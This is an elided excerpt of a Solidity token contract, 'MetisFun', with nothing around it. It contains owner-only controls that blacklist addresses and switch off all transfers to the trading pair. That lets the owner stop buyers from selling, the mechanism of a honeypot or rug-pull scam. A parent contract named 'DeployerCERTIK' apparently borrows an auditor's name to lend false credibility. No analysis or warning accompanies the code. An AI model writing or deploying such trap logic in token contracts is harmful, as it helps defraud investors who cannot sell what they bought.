...
contract MetisFun is Context, DeployerCERTIK, Ownable {
    ...
    string private _name = 'MetisFun';
    string private _symbol = 'MetisFun';
    uint8 private _decimals = 9;
    bool public metistxcheck = true;
    address public pair;
    ...
    function addToBlacklist(address[] calldata addresses, bool _status) public onlyOwner {
        uint256 length = addresses.length;
        for (uint256 i; i < length; ++i) {
            _blacklisted[addresses[i]] = _status;
        }
    }
    ...
    function metisCheck(bool value) public onlyOwner {
        metistxcheck = value;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        require(!_blacklisted[sender], "Nope V1");
        if(recipient == pair){require(metistxcheck, "Nope V2");}
